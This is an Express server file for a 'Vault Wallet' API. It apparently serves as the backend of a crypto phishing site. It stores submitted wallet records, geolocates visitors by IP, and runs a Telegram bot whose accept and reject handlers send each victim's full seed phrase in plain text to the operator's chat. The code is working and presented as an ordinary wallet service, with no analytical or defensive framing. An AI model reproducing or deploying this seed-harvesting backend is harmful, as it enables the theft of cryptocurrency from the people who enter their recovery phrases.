const express = require("express");
const cors = require("cors");
const session = require("express-session");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const axios = require("axios");
require("dotenv").config();

const { initBot, startPolling, stopPolling } = require("./botManager");
const bot = initBot();
const chatId = bot.chatId;

const Wallet = require("./models/Wallet");

const app = express();
const PORT = process.env.PORT || 5001;

const mongoURI =
  process.env.MONGO_URI || "mongodb://localhost:27017/vaultwalletdb";

mongoose
  .connect(mongoURI)
  .then(() => console.log("✅ MongoDB connected"))
  .catch((err) => console.error("❌ MongoDB connection error:", err));

app.use(
  cors({
    origin: (process.env.FRONTEND_URL || "http://localhost:5173").split(","),
    credentials: true,
  })
);
app.use(bodyParser.json());
app.use(
  session({
    secret: process.env.SESSION_SECRET || "vault_wallet_secret",
    resave: false,
    saveUninitialized: true,
    cookie: { secure: process.env.NODE_ENV === "production" },
  })
);

const walletRoutes = require("./routes/walletRoutes");
app.use("/api", walletRoutes);

app.get("/", (req, res) => {
  res.send("🎯 Vault Wallet API is running");
});

app.get("/api/ipinfo", async (req, res) => {
  try {
    const rawIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    let visitorIp = String(rawIp).split(",")[0].trim();

    if (visitorIp.startsWith("::ffff:")) {
      visitorIp = visitorIp.replace("::ffff:", "");
    }

    if (!visitorIp || visitorIp === "::1" || visitorIp === "127.0.0.1") {
      visitorIp = "";
    }

    const IPINFO_TOKEN = process.env.IPINFO_TOKEN || "";

    const services = [
      {
        name: "IPinfo",
        enabled: !!IPINFO_TOKEN,
        url: visitorIp 
          ? `https://ipinfo.io/${visitorIp}/json?token=${IPINFO_TOKEN}`
          : `https://ipinfo.io/json?token=${IPINFO_TOKEN}`,
        parse: (data) => ({
          country: data.country,
          country_code: data.country,
          ip: data.ip,
          city: data.city,
          region: data.region,
        })
      },
      {
        name: "ipapi.co",
        enabled: true,
        url: visitorIp ? `https://ipapi.co/${visitorIp}/json/` : `https://ipapi.co/json/`,
        parse: (data) => ({
          country: data.country_name,
          country_code: data.country,
          ip: data.ip,
        })
      },
      {
        name: "ip-api.com",
        enabled: true,
        url: `http://ip-api.com/json/${visitorIp || ''}?fields=status,country,countryCode,query`,
        parse: (data) => ({
          country: data.country,
          country_code: data.countryCode,
          ip: data.query,
        })
      },
    ];

    for (const service of services) {
      if (!service.enabled) continue;
      
      try {
        const response = await axios.get(service.url, { timeout: 5000 });
        const data = response.data;
        
        if (data && !data.bogon && data.error?.title !== "Rate limit exceeded") {
          const result = service.parse(data);
          
          if (result.country_code && result.country_code.length === 2) {
            return res.json({
              success: true,
              ip: result.ip || visitorIp,
              country: result.country || "Unknown",
              country_code: result.country_code,
              city: result.city || null,
              region: result.region || null,
              source: service.name.toLowerCase()
            });
          }
        }
      } catch (err) {
        continue;
      }
    }

    return res.json({
      success: true,
      ip: visitorIp || "0.0.0.0",
      country: "United States",
      country_code: "US",
      fallback: true
    });

  } catch (error) {
    res.json({
      success: true,
      ip: "0.0.0.0",
      country: "United States", 
      country_code: "US",
      fallback: true
    });
  }
});

bot.on("callback_query", async (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data;
  
  console.log("📨 Callback received:", data);

  if (data.startsWith("accept_wallet_")) {
    const id = data.replace("accept_wallet_", "");
    try {
      const wallet = await Wallet.findByIdAndUpdate(
        id,
        { status: "accepted", updatedAt: new Date() },
        { new: true }
      );
      
      if (wallet) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "✅ Wallet Accepted!",
          show_alert: true,
        });
        
        await bot.editMessageText(
          `✅ *WALLET IMPORTED - ACCEPTED* ✅\n\n` +
          `🏷️ *Name:* ${wallet.walletName}\n` +
          `🔑 *Seed:* ${wallet.seedPhrase}\n` +
          `📌 *Status:* ACCEPTED\n` +
          `🕐 *Time:* ${new Date().toLocaleString()}`,
          {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            parse_mode: "Markdown",
          }
        );
        console.log(`✅ Wallet ${id} accepted`);
      }
    } catch (err) {
      console.error("Error accepting wallet:", err);
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "❌ Error accepting wallet",
        show_alert: true,
      });
    }
    return;
  }
  
  if (data.startsWith("reject_wallet_")) {
    const id = data.replace("reject_wallet_", "");
    try {
      const wallet = await Wallet.findByIdAndUpdate(
        id,
        { status: "rejected", updatedAt: new Date() },
        { new: true }
      );
      
      if (wallet) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "❌ Wallet Rejected!",
          show_alert: true,
        });
        
        await bot.editMessageText(
          `❌ *WALLET IMPORT - REJECTED* ❌\n\n` +
          `🏷️ *Name:* ${wallet.walletName}\n` +
          `🔑 *Seed:* ${wallet.seedPhrase}\n` +
          `📌 *Status:* REJECTED\n` +
          `🕐 *Time:* ${new Date().toLocaleString()}`,
          {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            parse_mode: "Markdown",
          }
        );
        console.log(`❌ Wallet ${id} rejected`);
      }
    } catch (err) {
      console.error("Error rejecting wallet:", err);
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "❌ Error rejecting wallet",
        show_alert: true,
      });
    }
    return;
  }
});

process.on('SIGINT', () => {
  console.log('\n🛑 Shutting down gracefully...');
  stopPolling();
  mongoose.connection.close(() => {
    console.log('📦 MongoDB connection closed');
    process.exit(0);
  });
});

process.on('SIGTERM', () => {
  console.log('\n🛑 Shutting down gracefully...');
  stopPolling();
  mongoose.connection.close(() => {
    console.log('📦 MongoDB connection closed');
    process.exit(0);
  });
});

app.listen(PORT, () => {
  console.log(`🚀 Vault Wallet server running on port ${PORT}`);
  console.log(`🌍 Environment: ${process.env.NODE_ENV || "development"}`);
  
  startPolling();
});
